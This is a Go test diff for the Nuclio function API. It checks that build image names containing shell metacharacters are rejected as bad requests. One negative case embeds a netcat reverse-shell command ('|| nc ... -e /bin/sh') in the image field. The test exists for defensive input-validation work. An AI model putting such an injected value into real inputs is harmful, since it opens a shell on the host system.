@@ -424,6 +424,88 @@ func (suite *functionTestSuite) TestCreateFunctionWithInvalidName() {
 	suite.mockPlatform.AssertExpectations(suite.T())
 }
 
+func (suite *functionTestSuite) TestSanitizeFunctionInfo() {
+	bodyPattern := `{
+	"metadata": {
+		"namespace": "f1-namespace",
+		"name": "f1",
+		"labels": {
+			"nuclio.io/project-name": "proj"
+        }
+	},
+	"spec": {
+		"resources": {},
+		"build": {
+        	"image": "%s"
+        },
+		"platform": {},
+		"runtime": "r1"
+	}
+}`
+	headers := map[string]string{
+		"x-nuclio-wait-function-action": "true",
+	}
+	for buildImage, expectedStatusCode := range map[string]int{
+
+		// positive cases
+		"repo/image:v1.0.0":                       http.StatusAccepted,
+		"123.123.123.123:123/image/tag:v1.0.0":    http.StatusAccepted,
+		"some-domain.com/image/tag":               http.StatusAccepted,
+		"some-domain.com/image/tag:v1.1.1-patch1": http.StatusAccepted,
+		"image/tag":          http.StatusAccepted,
+		"image":              http.StatusAccepted,
+		"image:v1.1.1-patch": http.StatusAccepted,
+		"ubuntu@sha256:45b23dee08af5e43a7fea6c4cf9c25ccf269ee113168c19722f87876677c5cb2": http.StatusAccepted,
+
+		// negative cases
+		"image/tag:v1.0.0 || nc 127.0.0.1 8000 -e /bin/sh ls": http.StatusBadRequest,
+		"123.123.123.123:123/tag:v1.0.0 || echo something ":   http.StatusBadRequest,
+	} {
+		requestBody := fmt.Sprintf(bodyPattern, buildImage)
+		suite.logger.InfoWith("Running function sanitization case",
+			"buildImage", buildImage,
+			"expectedStatusCode", expectedStatusCode)
+
+		var encodedExpectedResponse interface{}
+		if expectedStatusCode > 299 {
+			encodedExpectedResponse = restful.NewErrorContainsVerifier(suite.logger, []string{"Invalid"}).Verify
+		} else {
+
+			verifyCreateFunction := func(createFunctionOptions *platform.CreateFunctionOptions) bool {
+				suite.Require().Equal("f1", createFunctionOptions.FunctionConfig.Meta.Name)
+				suite.Require().Equal("f1-namespace", createFunctionOptions.FunctionConfig.Meta.Namespace)
+				suite.Require().Equal("proj", createFunctionOptions.FunctionConfig.Meta.Labels["nuclio.io/project-name"])
+
+				return true
+			}
+
+			verifyGetFunctions := func(getFunctionsOptions *platform.GetFunctionsOptions) bool {
+				suite.Require().Equal("f1", getFunctionsOptions.Name)
+				suite.Require().Equal("f1-namespace", getFunctionsOptions.Namespace)
+				return true
+			}
+
+			suite.mockPlatform.
+				On("CreateFunction", mock.MatchedBy(verifyCreateFunction)).
+				Return(&platform.CreateFunctionResult{}, nil).
+				Once()
+
+			suite.mockPlatform.
+				On("GetFunctions", mock.MatchedBy(verifyGetFunctions)).
+				Return([]platform.Function{}, nil).
+				Once()
+		}
+
+		suite.sendRequest("POST",
+			"/api/functions",
+			headers,
+			bytes.NewBufferString(requestBody),
+			&expectedStatusCode,
+			encodedExpectedResponse)
+
+		suite.mockPlatform.AssertExpectations(suite.T())
+	}
+}
 func (suite *functionTestSuite) TestUpdateSuccessful() {
 	suite.T().Skip("Update not supported")
 
